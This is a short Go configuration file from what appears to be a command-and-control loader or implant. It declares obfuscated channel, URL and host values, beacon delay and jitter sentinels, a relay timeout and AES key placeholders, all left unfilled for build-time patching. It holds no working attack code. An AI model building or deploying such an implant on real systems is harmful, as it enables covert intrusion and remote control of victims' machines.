package global

import (
	"loader/utils/obf"
)

var (
	Channel                = obf.S("<channel>")
	Url                    = obf.S("<url>")
	HostTag                = obf.S("<hostTag>")
	BeaconDelay            = 867530901
	Jitter                 = 867530902
	RelayTimeout           = 5 * 60 * 1000
	PipelineTarget         = obf.S("<pipelineTarget>")
	AesKey                 = "<aesKey>"
	AesRelayKey            = "<aesRelayKey>"
)
